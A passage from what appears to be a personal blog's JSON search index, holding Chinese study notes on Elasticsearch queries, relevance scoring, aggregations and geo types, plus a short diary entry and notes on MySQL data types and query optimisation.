","date":"2020-10-16","objectID":"/2020/10/elastic%E7%AC%94%E8%AE%B0/:18:1","tags":null,"title":"Elastic笔记","uri":"/2020/10/elastic%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"基于全文的查询 ","date":"2020-10-16","objectID":"/2020/10/elastic%E7%AC%94%E8%AE%B0/:19:0","tags":null,"title":"Elastic笔记","uri":"/2020/10/elastic%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"词项匹配 match 查询 接受文本、数值和日期类型值。在检索时将查询条件做分词处理再以提取出来的词项与字段做匹配。如果提取出来的词项为多个，词项与词项之间的匹配结果按布尔或运算。 词项匹配的运算逻辑和匹配个数通过operator和minimum_should_match来改变 multi_match 与 match 类似，但可以实现对多字段的同时匹配 ","date":"2020-10-16","objectID":"/2020/10/elastic%E7%AC%94%E8%AE%B0/:19:1","tags":null,"title":"Elastic笔记","uri":"/2020/10/elastic%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"短语匹配 match_phrase 查询 将查询条件按顺序分词，然后再查看他们在字段中的位置之差，只有差都为 1 才满足查询条件，换句话说就是这些词项要紧挨着。 match_phrase_prefix 查询 在这种匹配中，最后一个词项可以设置为前缀。 ","date":"2020-10-16","objectID":"/2020/10/elastic%E7%AC%94%E8%AE%B0/:19:2","tags":null,"title":"Elastic笔记","uri":"/2020/10/elastic%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"查询字符串 查询字符串是具有一定逻辑的字符串，因此不会直接分词提取，而是先通过某种类型的解析器解析为逻辑操作符和更小的字符串。 query_string 查询 是基于请求体查询字符串的形式，与基于 URI 时使用的请求参数 q 没有本质区别。可以用field_name:query_term的形式 simple_query_string 是对 query_string 查询的简化，体现在解析字符串是会忽略异常。 ","date":"2020-10-16","objectID":"/2020/10/elastic%E7%AC%94%E8%AE%B0/:19:3","tags":null,"title":"Elastic笔记","uri":"/2020/10/elastic%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"间隔查询： 可以定义一组词项或短语组成的匹配规则，然后按顺序在文本中检查这些规则 intervals 主要包括 all_of、any_of 和 match 三个参数 ","date":"2020-10-16","objectID":"/2020/10/elastic%E7%AC%94%E8%AE%B0/:19:4","tags":null,"title":"Elastic笔记","uri":"/2020/10/elastic%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"模式查询 fuzzy 查询 模糊查询 suggest 纠错和提示。 提示器： term：会将需要提示的文本拆分成词项，然后对每一个词项做单独的提示 phrase：使用整个文本内容做提示 completion 提示器：同于输入提示和自动补全。需要提示词产生的字段为 completion 类型 相关性评分与组合查询 ","date":"2020-10-16","objectID":"/2020/10/elastic%E7%AC%94%E8%AE%B0/:19:5","tags":null,"title":"Elastic笔记","uri":"/2020/10/elastic%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"相关性评分 ","date":"2020-10-16","objectID":"/2020/10/elastic%E7%AC%94%E8%AE%B0/:20:0","tags":null,"title":"Elastic笔记","uri":"/2020/10/elastic%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"相关度模型 布尔模型 向量空间模型 概率模型 语言模型 ","date":"2020-10-16","objectID":"/2020/10/elastic%E7%AC%94%E8%AE%B0/:20:1","tags":null,"title":"Elastic笔记","uri":"/2020/10/elastic%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"TF/IDF TF：term frequency,词频。 IDF：invert document frequency,逆向文档频率，指词项在所有文档中出现的次数。 TF 越高，相关度越高，IDF 越高，相关度越低。 ","date":"2020-10-16","objectID":"/2020/10/elastic%E7%AC%94%E8%AE%B0/:20:2","tags":null,"title":"Elastic笔记","uri":"/2020/10/elastic%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"BM25 被认为是当今最先进的相关度算法之一。 ","date":"2020-10-16","objectID":"/2020/10/elastic%E7%AC%94%E8%AE%B0/:20:3","tags":null,"title":"Elastic笔记","uri":"/2020/10/elastic%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"相关度解释 相关度算法可通过 text 和 keyword 类型字段的 similarity 参数修改，也就是说相关度算法不针对整个文档而是针对单个字段，默认是 BM25。 ","date":"2020-10-16","objectID":"/2020/10/elastic%E7%AC%94%E8%AE%B0/:20:4","tags":null,"title":"Elastic笔记","uri":"/2020/10/elastic%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"相关度权重 boost 参数 默认是 1，在检索时设置 indices_boost 参数 可调整多索引查询条件时每个索引的权重 ","date":"2020-10-16","objectID":"/2020/10/elastic%E7%AC%94%E8%AE%B0/:20:5","tags":null,"title":"Elastic笔记","uri":"/2020/10/elastic%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"组合查询与相关度组合 ","date":"2020-10-16","objectID":"/2020/10/elastic%E7%AC%94%E8%AE%B0/:21:0","tags":null,"title":"Elastic笔记","uri":"/2020/10/elastic%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"bool 组合查询 子句类型： must：影响相关度 filter：不影响 should：影响 must_not：不影响 当 should 字句与 must 字句或 filter 字句同时出现时，should 字句不会过滤结果。 ","date":"2020-10-16","objectID":"/2020/10/elastic%E7%AC%94%E8%AE%B0/:21:1","tags":null,"title":"Elastic笔记","uri":"/2020/10/elastic%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"dis_max 组合查询 在计算相关度值时，会在子查询中取最大相关性值为最终相关度分值结果，而忽略其他子查询的相关性得分。 通过 queries 参数接受对象数组，数组元素可以是前面讲解的叶子查询。 可以用 tie_breaker 参数设置其他字段参与相关度运算的系数。 ","date":"2020-10-16","objectID":"/2020/10/elastic%E7%AC%94%E8%AE%B0/:21:2","tags":null,"title":"Elastic笔记","uri":"/2020/10/elastic%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"constant_score 查询 返回结果的相关度为固定值，由 boost 参数设置。 match_all 可以当成一个 boost 为 1 的 constant_score 查询。 ","date":"2020-10-16","objectID":"/2020/10/elastic%E7%AC%94%E8%AE%B0/:21:3","tags":null,"title":"Elastic笔记","uri":"/2020/10/elastic%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"boosting 查询 通过 positive 字句设置满足条件的文档，类似 boost 查询中的 must 字句。通过 negative 字句设置需要排除文档的条件，类似 boost 的 must_not 字句。 不同的是，不会将满足 negative 条件的文档从返回结果中排除，而只是会拉低他们的相关性分值。 参数 negative_boost 设置一个系数，当满足 negative 时相关度会乘这个系数，所以系数要大于 0 小于 1。 ","date":"2020-10-16","objectID":"/2020/10/elastic%E7%AC%94%E8%AE%B0/:21:4","tags":null,"title":"Elastic笔记","uri":"/2020/10/elastic%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"function_score 查询 通过为查询条件定义不同的打分函数实现自定义打分，使用 functions 参数设置打分函数。 打分函数如果有多个，最后打分函数的值由 score_mode 的值来决定。 打分函数运算的相关性评分会与 query 参数中查询条件的相关度组合起来，组合的方式是通过 boost_mode 参数指定。 当只有一个打分函数值，可以直接使用打分函数名称做设置，取代 functions。 几个内置的打分函数： weight：固定值 random_score：0-1 之间的随机数 script_score：通过脚本得到值，非负 field_value_factor：加入某一字段作为干扰因子。 衰减函数 ： gauss（高斯） linear（线性） exp（指数函数） ","date":"2020-10-16","objectID":"/2020/10/elastic%E7%AC%94%E8%AE%B0/:21:5","tags":null,"title":"Elastic笔记","uri":"/2020/10/elastic%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"相关度组合 query_string 和 multi_match 查询，由于对多个字段设置查询条件，所以需要考虑组合多个相关度的问题。 type 参数指定多个字段的执行逻辑和相关度组合方法。有下面这些值可选： best_field 取最高分为整个查询的相关度。在执行时会转化为 dis_max 查询 phrase 和 phrase_prefix 执行逻辑与 best_field 完全相同，至于在转化为 dis_max 时 queries 查询中的子查询会使用 phrase 或 phrase_prefix 而不是 match most_field 会将所有相关度累加，再除以相关度的个数。会转化为 bool 查询的 should 字句 cross_field 会将词项拆分，在效果上不要求字段同时包含多个词项，而要求词项分散在多个字段中。 聚集查询 执行聚集查询时参数是aggregation或简写aggs。 ","date":"2020-10-16","objectID":"/2020/10/elastic%E7%AC%94%E8%AE%B0/:21:6","tags":null,"title":"Elastic笔记","uri":"/2020/10/elastic%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"指标聚集 ","date":"2020-10-16","objectID":"/2020/10/elastic%E7%AC%94%E8%AE%B0/:22:0","tags":null,"title":"Elastic笔记","uri":"/2020/10/elastic%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"平均值聚集 avg 聚集 weighted_avg 聚集：权重值可以从文档的某一字段中获取，也可以通过脚本运算 ","date":"2020-10-16","objectID":"/2020/10/elastic%E7%AC%94%E8%AE%B0/:22:1","tags":null,"title":"Elastic笔记","uri":"/2020/10/elastic%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"计数聚集和极值聚集 计数聚集同于统计字段值的数量，而极值聚集则是查找字段的极大值和极小值，都支持使用脚本。 计数聚集 value_count聚集和cardinality聚集可以归入计数聚集，前者用于统计从字段中取值的总数，而后者则用于统计不重复数值的总数 极值聚集 是在文档中提取某一字段的最大值或最小值的聚集，包括 max 聚集和 min 聚集 ","date":"2020-10-16","objectID":"/2020/10/elastic%E7%AC%94%E8%AE%B0/:22:2","tags":null,"title":"Elastic笔记","uri":"/2020/10/elastic%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"统计聚集 stats 聚集 stats 聚集返回的结果中包括字段的最大值、最小值、总和、数量和平均值 entended_stats 聚集 增加了几项统计数据 ","date":"2020-10-16","objectID":"/2020/10/elastic%E7%AC%94%E8%AE%B0/:22:3","tags":null,"title":"Elastic笔记","uri":"/2020/10/elastic%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"百分位聚集 根据文档字段统计字段值按百分比的分布情况，包括percentiles聚集和percentile_ranks两种。前者统计的是百分比与值的对应关系，后者正好相反，统计值与百分比的对应关系。 ","date":"2020-10-16","objectID":"/2020/10/elastic%E7%AC%94%E8%AE%B0/:22:4","tags":null,"title":"Elastic笔记","uri":"/2020/10/elastic%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"使用范围分桶 ","date":"2020-10-16","objectID":"/2020/10/elastic%E7%AC%94%E8%AE%B0/:23:0","tags":null,"title":"Elastic笔记","uri":"/2020/10/elastic%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"数值范围 range 使用 ranges 参数设置多个数值范围 date_range 与 range 类似，只是范围和字段的类型为日期而非数值 ip_range ip 范围 ","date":"2020-10-16","objectID":"/2020/10/elastic%E7%AC%94%E8%AE%B0/:23:1","tags":null,"title":"Elastic笔记","uri":"/2020/10/elastic%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"间隔范围 histogram 以数值为间隔定义数值范围，字段值具有相同范围的文档落入同一桶中。 date_histogram 以时间为间隔定义日期范围，字段值具有相同日期范围的文档落入同一桶中。 auto_date_histogram 预先指定需要返回多少个桶，间隔值通过桶的数量及字段值的跨度共同决定。 ","date":"2020-10-16","objectID":"/2020/10/elastic%E7%AC%94%E8%AE%B0/:23:2","tags":null,"title":"Elastic笔记","uri":"/2020/10/elastic%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"聚集嵌套 前两小节介绍的桶型聚集，他们的结果都只是返回满足聚集条件的文档数量。通过嵌套聚集才能实现强大的功能。 嵌套聚集应该位于父聚集名称下而与聚集类型同级，并且需要 aggs 参数再次声明使用。 ","date":"2020-10-16","objectID":"/2020/10/elastic%E7%AC%94%E8%AE%B0/:23:3","tags":null,"title":"Elastic笔记","uri":"/2020/10/elastic%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"使用词项分桶 对于字符串类型的字段来说，显然不适合用范围分桶。字符串类型字段的分桶一般是通过词项实现。 ","date":"2020-10-16","objectID":"/2020/10/elastic%E7%AC%94%E8%AE%B0/:24:0","tags":null,"title":"Elastic笔记","uri":"/2020/10/elastic%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"terms 聚集 根据文档中的词项做分桶，所有包含同一词项的文档将被归入同一桶中。默认还会根据词频排序。对于 text 类型的字段需要打开 fielddata 机制。会导致内存消耗大，所以 terms 聚集一般针对 keyword 类型。 与 cardinality 聚集一样，terms 聚集统计出来的词频也不能保证完全精确。 ","date":"2020-10-16","objectID":"/2020/10/elastic%E7%AC%94%E8%AE%B0/:24:1","tags":null,"title":"Elastic笔记","uri":"/2020/10/elastic%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"significant_terms 聚集 它将文档和词项分为前景集和背景集。前景集对应一个文档子集，而背景集对应文档全集。significant_terms 根据 query（和 aggs 同级）指定前景集，运算 field 参数指定字段中短词项在前景集和背景集中的词频总和，并在结果的 doc_count 和 bg_count 中保存它们。 ","date":"2020-10-16","objectID":"/2020/10/elastic%E7%AC%94%E8%AE%B0/:24:2","tags":null,"title":"Elastic笔记","uri":"/2020/10/elastic%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"significant_text 聚集 如果参与 significant_terms 聚集的字段类型是 text 类型，那么 需要打开 fielddata 机制。significant_text 就不需要打开 fielddata 机制。 ","date":"2020-10-16","objectID":"/2020/10/elastic%E7%AC%94%E8%AE%B0/:24:3","tags":null,"title":"Elastic笔记","uri":"/2020/10/elastic%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"样本 sample 聚集的作用是限定其内部嵌套聚集在运算时采用的样本数量，样本数量是在每个分片上的数量而不是整体数量。提取样本时会按照文档检索的相似度排序，由高到低的顺序提取。 为了降低样本减少对结果的准确性，需要将一些重复的数据从样本中剔除。diversified_sampler 聚集提供了样本多样性的能力。它提供了 field 或 script 两个参数用于去除样本中可能重复的数据。 ","date":"2020-10-16","objectID":"/2020/10/elastic%E7%AC%94%E8%AE%B0/:24:4","tags":null,"title":"Elastic笔记","uri":"/2020/10/elastic%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"单桶聚集和聚集组合 前三节都是多桶型聚集。 ","date":"2020-10-16","objectID":"/2020/10/elastic%E7%AC%94%E8%AE%B0/:25:0","tags":null,"title":"Elastic笔记","uri":"/2020/10/elastic%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"单桶聚集 在返回的结果中只会形成一个桶。 过滤型聚集 filter filters（属于多桶聚集） global 聚集 把索引中所有文档归入一个桶中 missing 聚集 将某一字段缺失的文档归入一桶 ","date":"2020-10-16","objectID":"/2020/10/elastic%E7%AC%94%E8%AE%B0/:25:1","tags":null,"title":"Elastic笔记","uri":"/2020/10/elastic%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"聚集组合 composite 聚集可以将不类型的聚集组合到一起，它会从不同的聚集中提取数据并以笛卡尔乘积的形式组合它们，而每一个组合就会形成一个新桶。 返回的结果会有一个 after_key 字段，它包含了当前聚集结果最后一个结果的 key.所以下一页聚集结果就可以通过 after 和 size 参数指定。 ","date":"2020-10-16","objectID":"/2020/10/elastic%E7%AC%94%E8%AE%B0/:25:2","tags":null,"title":"Elastic笔记","uri":"/2020/10/elastic%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"领接矩阵 类似图论中的无向图邻接矩阵。 adjacency_matrix 顶点指的是一组过滤条件，而这些条件两两组合就形成了邻接矩阵。所以使用邻接矩阵一定要给定一组过滤条件。 ","date":"2020-10-16","objectID":"/2020/10/elastic%E7%AC%94%E8%AE%B0/:25:3","tags":null,"title":"Elastic笔记","uri":"/2020/10/elastic%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"管道聚集 可分为基于父聚集结果和基于兄弟聚集结果两类。前者将运算结果加到父聚集结果中，后者展示在自己的聚集结果中。 聚集名称与聚集名称之间的分隔符是“\u003e”，聚集名称和指标名称之间的分隔符使用“.” ","date":"2020-10-16","objectID":"/2020/10/elastic%E7%AC%94%E8%AE%B0/:26:0","tags":null,"title":"Elastic笔记","uri":"/2020/10/elastic%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"基于兄弟聚集 包括 avg_bucket , max_bucket , min_bucket , sum_bucket , stats_bucket , extended_stats_bucket , percentiles_bucket 七种。 ","date":"2020-10-16","objectID":"/2020/10/elastic%E7%AC%94%E8%AE%B0/:26:1","tags":null,"title":"Elastic笔记","uri":"/2020/10/elastic%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"基于父聚集 包括 moving_avg（已弃用）, moving_fn , bucket_script , bucket_selector , bucket_sort , derivative , cumulative_sum , serial_diff 八种 滑动窗口 moving_avg（已弃用）和 moving_fn 都是基于滑动窗口。 moving_fn 内置了一个 MovingFunctions 类，包含多个运算函数。 单桶运算 moving_fn 会对父聚集结果中落在窗口内的多个桶做聚集运算，而 bucket_script , bucket_selector , bucket_sort 这三个会针对父聚集结果中的每一个桶做单独的运算 特定数学运算 剩下的 derivative , cumulative_sum , serial_diff 就是用于特定的数学运算。他们只能应用于 histogram 或 date_histogram 父聚集中。 derivative 求导，cumulative_sum 累计和，serial_diff 时序差分，就是贸易指标值与指定时间段之前值之差。 ","date":"2020-10-16","objectID":"/2020/10/elastic%E7%AC%94%E8%AE%B0/:26:2","tags":null,"title":"Elastic笔记","uri":"/2020/10/elastic%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"矩阵聚集 matrix_stats,通过 fields 参数接受统计字段的名称。 处理特殊数据类型 ","date":"2020-10-16","objectID":"/2020/10/elastic%E7%AC%94%E8%AE%B0/:27:0","tags":null,"title":"Elastic笔记","uri":"/2020/10/elastic%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"父子关系 ","date":"2020-10-16","objectID":"/2020/10/elastic%E7%AC%94%E8%AE%B0/:28:0","tags":null,"title":"Elastic笔记","uri":"/2020/10/elastic%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"join 类型 在 elasticsearch 中并没有外键的概念，文档之间的父子关系通过给索引定义 join 类型字段实现 PUT employees { \"mapping\":{ \"properties\":{ \"management\":{ \"type\":\"join\", \"relations\":{ \"manager\":\"member\" } } } } } manager 为父而 member 为子，名称可以由用户定义。文档在父子关系中的地位，是在添加文档时通过 join 类型字段指定的。 在使用父子关系时，要求父子文档必须要映射到同一分片中，所以在添加子文档时 routing 参数是必须要设置的。 可在父子关系中使用的查询有 has_child , has_parent 和 parent_id 查询，还有 parent 和 children 两种聚集 ","date":"2020-10-16","objectID":"/2020/10/elastic%E7%AC%94%E8%AE%B0/:28:1","tags":null,"title":"Elastic笔记","uri":"/2020/10/elastic%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"has_child 查询 是根据子文档检索父文档的一种方法。它先根据查询条件将满足条件的子文档检索出来，在最终的结果中会返回具有这些子文档的父文档。 ","date":"2020-10-16","objectID":"/2020/10/elastic%E7%AC%94%E8%AE%B0/:28:2","tags":null,"title":"Elastic笔记","uri":"/2020/10/elastic%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"has_parent 查询 与上面正好相反，是通过父文档检索子文档 ","date":"2020-10-16","objectID":"/2020/10/elastic%E7%AC%94%E8%AE%B0/:28:3","tags":null,"title":"Elastic笔记","uri":"/2020/10/elastic%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"parent_id 查询 和 has_parent 查询类似，都是根据父文档检索子文档。但 parent_id 查询只能通过父文档_id做检索。 ","date":"2020-10-16","objectID":"/2020/10/elastic%E7%AC%94%E8%AE%B0/:28:4","tags":null,"title":"Elastic笔记","uri":"/2020/10/elastic%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"children 聚集 如果想通过父文档检索与其关联的所有子文档就可以使用 children 聚集 ","date":"2020-10-16","objectID":"/2020/10/elastic%E7%AC%94%E8%AE%B0/:28:5","tags":null,"title":"Elastic笔记","uri":"/2020/10/elastic%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"parent 聚集 与 children 聚集相反，是根据子文档查找父文档。 ","date":"2020-10-16","objectID":"/2020/10/elastic%E7%AC%94%E8%AE%B0/:28:6","tags":null,"title":"Elastic笔记","uri":"/2020/10/elastic%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"嵌套类型 ","date":"2020-10-16","objectID":"/2020/10/elastic%E7%AC%94%E8%AE%B0/:29:0","tags":null,"title":"Elastic笔记","uri":"/2020/10/elastic%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"nested 类型 为了解决对象类型在数组中丢失内部字段之间匹配关系的问题。 这种类型会为数组中的每一个对象创建一个单独的文档，一保存对象的字段信息并使它们可检索。这类文档并不直接可见，而是藏匿在父文档之中。 当字段被设置为 nested 类型后，必须用专门的检索方法，包括 nested 查询，还有聚集查询中的 nested 和 reverse_nested 两种聚集。 ","date":"2020-10-16","objectID":"/2020/10/elastic%E7%AC%94%E8%AE%B0/:29:1","tags":null,"title":"Elastic笔记","uri":"/2020/10/elastic%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"nested 查询 nested 查询只能针对 nested 类型字段，需要通过 path 参数指定 nested 类型字段的路径，query 参数包含具体查询条件。 ","date":"2020-10-16","objectID":"/2020/10/elastic%E7%AC%94%E8%AE%B0/:29:2","tags":null,"title":"Elastic笔记","uri":"/2020/10/elastic%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"nested 聚集 是一个单桶聚集，通过 path 字段指定 nested 字段的路径，包含在 path 指定路径中的隐式文档都将落入桶中。 ","date":"2020-10-16","objectID":"/2020/10/elastic%E7%AC%94%E8%AE%B0/:29:3","tags":null,"title":"Elastic笔记","uri":"/2020/10/elastic%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"reverse_nested 聚集 用于在隐式文档中对父文档做聚集，所以这种聚集必须作为 nested 聚集的嵌套聚集使用。 ","date":"2020-10-16","objectID":"/2020/10/elastic%E7%AC%94%E8%AE%B0/:29:4","tags":null,"title":"Elastic笔记","uri":"/2020/10/elastic%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"处理地理信息 ","date":"2020-10-16","objectID":"/2020/10/elastic%E7%AC%94%E8%AE%B0/:30:0","tags":null,"title":"Elastic笔记","uri":"/2020/10/elastic%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"地理类型字段 geo_point 类型 可以用经纬度或 GeoHash 编码来表示位置 geo_shape 类型 用于存储地理形状。 ","date":"2020-10-16","objectID":"/2020/10/elastic%E7%AC%94%E8%AE%B0/:30:1","tags":null,"title":"Elastic笔记","uri":"/2020/10/elastic%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"geo_shape 查询 根据 geo_shape 类型来过滤文档。 ","date":"2020-10-16","objectID":"/2020/10/elastic%E7%AC%94%E8%AE%B0/:30:2","tags":null,"title":"Elastic笔记","uri":"/2020/10/elastic%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"geo_bounding_box 查询 和 geo_shape 类型，只是查询条件中指定的形状只能是矩形 ","date":"2020-10-16","objectID":"/2020/10/elastic%E7%AC%94%E8%AE%B0/:30:3","tags":null,"title":"Elastic笔记","uri":"/2020/10/elastic%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"geo_distance 查询 将所有该再传存储点到指定点距离小于某一特定值的文档查询出来。 ","date":"2020-10-16","objectID":"/2020/10/elastic%E7%AC%94%E8%AE%B0/:30:4","tags":null,"title":"Elastic笔记","uri":"/2020/10/elastic%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"geo_polygon 查询 和 geo_bounding_box 类型，但只是定义查询条件为多边形，不要求一定是矩形。 ","date":"2020-10-16","objectID":"/2020/10/elastic%E7%AC%94%E8%AE%B0/:30:5","tags":null,"title":"Elastic笔记","uri":"/2020/10/elastic%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"geohash_grid 聚集 很句 GeoHash 运算区域，并根据文档 geo_point 类型的字段将文档归入不同区域形成的桶中。 ","date":"2020-10-16","objectID":"/2020/10/elastic%E7%AC%94%E8%AE%B0/:30:6","tags":null,"title":"Elastic笔记","uri":"/2020/10/elastic%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"geo_distence 聚集 根据文档中某个坐标字段到指定地理位置的距离分组。 ","date":"2020-10-16","objectID":"/2020/10/elastic%E7%AC%94%E8%AE%B0/:30:7","tags":null,"title":"Elastic笔记","uri":"/2020/10/elastic%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"使用 SQL 语言 ","date":"2020-10-16","objectID":"/2020/10/elastic%E7%AC%94%E8%AE%B0/:31:0","tags":null,"title":"Elastic笔记","uri":"/2020/10/elastic%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"_sql接口 _sql接口通过 query 参数接受 SQL 语句，URL 请求参数 format 定义返回的格式。 ","date":"2020-10-16","objectID":"/2020/10/elastic%E7%AC%94%E8%AE%B0/:31:1","tags":null,"title":"Elastic笔记","uri":"/2020/10/elastic%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"操作符与函数 引入了一个等号比较\u003c=\u003e，可以在左值为 null 时不出现异常。 LIKE 字句可以用%代表任意多个字符，用_代表单个字符。还可以用 RLIKE 使用正则表达式。 还有 MATCH 和 QUERY 实现全文检索。 ","date":"2020-10-16","objectID":"/2020/10/elastic%E7%AC%94%E8%AE%B0/:31:2","tags":null,"title":"Elastic笔记","uri":"/2020/10/elastic%E7%AC%94%E8%AE%B0/"},{"categories":["随笔"],"content":"转眼就十月了，天突然就变得很凉了，有冬天的感觉了，惊觉这一年马上就要结束了。年龄愈大，愈觉时间飞快。 回想这一年自己做了什么？无非“读书”二字。能有空读自己喜欢的书真是幸福~~九月开学，认识了一些新朋友，也丢了许多。也愈来愈理解那句话：“可能这就是人生吧~”。以前觉得很重要的东西，现在愈觉是尘埃，可有可无，无所谓，顺其自然。 一直告诫自己活在当下，可要做到谈何容易？不过相比过去，还是好了很多，希望自己能慢慢做到吧~ 今年还剩不到两个月了，定个小目标，争取把书单里剩的书都看完把~ 冲鸭！！！ ","date":"2020-10-07","objectID":"/2020/10/%E5%9B%BD%E5%BA%86%E5%B0%BE/:0:0","tags":null,"title":"国庆尾","uri":"/2020/10/%E5%9B%BD%E5%BA%86%E5%B0%BE/"},{"categories":null,"content":"SQL 分类： DDL：数据定义语言。定义数据库，表，列，索引等。create,drop,alter DML：数据操纵语言。增删改查。insert,delete,update,select DCL：数据控制语言。定义了访问权限和安全级别。grant,revoke MySQL 操作所影响的记录行数，通常只对增删改生效，drop 等 DDL 操作通常显示 “0 rows affected” HAVING 和 WHERE 的区别在于，HAVING 是对聚合后的结果进行条件的过滤，而 WHERE 是在聚合前就对记录进行过滤。 ","date":"2020-10-03","objectID":"/2020/10/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BAmysql%E7%AC%94%E8%AE%B0/:0:0","tags":null,"title":"深入浅出MySql笔记","uri":"/2020/10/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BAmysql%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"数据类型 对于整数类型，mysql 持支在类型名称后面的小括号内指定显示宽度。例如，int(5)表示当数值宽度小于 5 时在数字前面填满宽度，默认是 int(11),配合 zerofill 用 0 填充，默认是空格。 在检索的时候，char 列会删除尾部空格，而 varchar 不会。 ","date":"2020-10-03","objectID":"/2020/10/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BAmysql%E7%AC%94%E8%AE%B0/:1:0","tags":null,"title":"深入浅出MySql笔记","uri":"/2020/10/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BAmysql%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"SQL 优化 通过show status命令了解各种 SQL 的执行频率 ","date":"2020-10-03","objectID":"/2020/10/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BAmysql%E7%AC%94%E8%AE%B0/:2:0","tags":null,"title":"深入浅出MySql笔记","uri":"/2020/10/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BAmysql%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"可以通过下面两种方法定位执行效率低的 SQL： 通过慢日志查询。将slow-query-log设为 1，MySQL 会将执行时间超过long_query_time参数设定阈值的 SQL 写入show_query_log_file 慢日志日志在查询结束以后才记录，所以可以用show processlist命令查看当前 MySQL 在进行的线程 ","date":"2020-10-03","objectID":"/2020/10/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BAmysql%E7%AC%94%E8%AE%B0/:2:1","tags":null,"title":"深入浅出MySql笔记","uri":"/2020/10/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BAmysql%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"通过 EXPLAIN 分析低效 SQL 的执行计划 从上到下，越来越快： type=ALl ，全表扫描 type=index ，索引全扫描，MySQL 遍历整个索引来查询匹配的行：select username from user type=range，索引范围扫描 type=ref ,使用非唯一索引扫描或唯一索引的前缀扫描，返回匹配某个单独值的记录行，例如：select * from user where username = '张三'; type=eq_ref，类似 ref，区别就在使用的索引是唯一索引 type=const/system ，单表中最多有一个匹配行，查询起来非常迅速，所以这个匹配行中的其他列的值可以被优化器在当前查询中当作常量来处理，例如根据主键或唯一索引进行的查询。 type=NULL,MySQL 不用访问表或索引，直接就能得到结果。 ","date":"2020-10-03","objectID":"/2020/10/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BAmysql%E7%AC%94%E8%AE%B0/:2:2","tags":null,"title":"深入浅出MySql笔记","uri":"/2020/10/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BAmysql%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"通过show profile或show profile分析 SQL ","date":"2020-10-03","objectID":"/2020/10/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BAmysql%E7%AC%94%E8%AE%B0/:2:3","tags":null,"title":"深入浅出MySql笔记","uri":"/2020/10/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BAmysql%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"通过 trace 分析优化器如何选择执行计划 